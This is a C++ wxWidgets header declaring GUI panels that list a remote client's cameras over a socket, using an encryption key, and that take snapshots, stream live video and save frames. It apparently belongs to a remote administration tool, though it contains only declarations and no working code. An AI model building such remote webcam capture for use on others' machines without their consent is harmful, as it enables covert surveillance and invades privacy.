#ifndef __CAM_
#define __CAM_

#include "headers.hpp"
#include <wx/mstream.h>

namespace EnumCamMenu {
	enum Enum {
		ID_SingleShot = 10000,
		ID_Close,
		ID_Main_Panel,
		ID_Combo_Devices,
		ID_Refrescar_Lista,
		ID_Spawn_Frame,
		ID_Picture_Frame,
		ID_Iniciar_Live,
		ID_Detener_Live,
		ID_Guardar_Frame
	};
}

class panelPictureBox : public wxFrame {
	public:
		panelPictureBox(wxWindow* parent, wxString cTitle, int iCamIndex, SOCKET sck, ByteArray c_key);

		bool isCalled = false;
		u_int uiWidth = 600;
		u_int uiHeight = 300;
		
		void OnDrawBuffer(const char*& cBuffer, int iBufferSize);
		
		//Eventos
		void OnSingleShot(wxCommandEvent& event);
		void OnLive(wxCommandEvent& event);
		void OnStopLive(wxCommandEvent& event);
		void OnGuardarFrame(wxCommandEvent& event);

		wxStaticBitmap* imageCtrl = nullptr;

	private:
		ByteArray enc_key;
		SOCKET sckCliente = INVALID_SOCKET;
		void OnClose(wxCloseEvent& event);

		wxDECLARE_EVENT_TABLE();
};


class panelCamara : public wxFrame {
	public:
		panelCamara(wxWindow* pParent, SOCKET sck, std::string _strID, ByteArray c_key);

		void ProcesarLista(const char*& pBuffer);
		void OnRefrescarLista(wxCommandEvent& event);
		void OnManageCam(wxCommandEvent& event);

		panelPictureBox* pictureBox = nullptr;

		ByteArray enc_key;

	private:
		SOCKET sckCliente = INVALID_SOCKET;
		wxComboBox* cam_Devices = nullptr;

		std::string strID = "";
		wxDECLARE_EVENT_TABLE();

};

#endif